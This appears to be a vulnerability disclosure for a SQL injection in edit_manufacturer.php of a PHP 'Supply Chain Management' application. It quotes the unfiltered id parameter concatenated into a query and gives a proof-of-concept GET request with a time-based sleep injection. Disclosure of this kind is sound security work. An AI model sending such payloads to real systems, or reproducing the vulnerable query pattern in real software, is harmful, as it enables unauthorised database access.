# Supply-Chain-Management-in-php-sql

https://code-projects.org/supply-chain-management-in-php-css-js-and-mysql-free-download/

## NAME OF AFFECTED PRODUCT(S)

**Supply Chain Management**

## Vendor Homepage

https://code-projects.org/supply-chain-management-in-php-css-js-and-mysql-free-download/

##  **Manufacturers sites**

https://code-projects.org/

## AFFECTED  VERSION(S)

### Vulnerable File

edit_manufacturer.php

### VERSION(S)

-  v1.0

### Software Link

https://download.code-projects.org/details/adc6862d-bae0-4b2e-8033-37ac6e72d9c2

## PROBLEM TYPE

network remote.

## Vulnerability Type

sql injection

## Root Cause

edit_manufacturer.php file, SQL injection is used to obtain database information.

## Impact

## **Description of the vulnerability**

### edit_manufacturer.php

source code，the  id parameter is not filtered and concatenated into the SQL statement.                                                                                                                                                                                                                                                                                                                                                                                                                                                               

```php
			$id = $_GET['id'];
			$query_selectManDetails = "SELECT * FROM manufacturer WHERE man_id='$id'";
```
![image](https://github.com/user-attachments/assets/46bdf10f-e2e6-49be-a282-1217049f6928)

## **Vulnerability recurrence**

### **POC**

```
GET /scm-master/admin/edit_manufacturer.php?id=1' or sleep(1)--+ HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="127", "Not)A;Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=kbl2la41fb9amsrdcps7i0c26r
Connection: keep-alive

```
![image](https://github.com/user-attachments/assets/1e58be0c-aee8-46ee-8ee9-0c4c842d2dad)



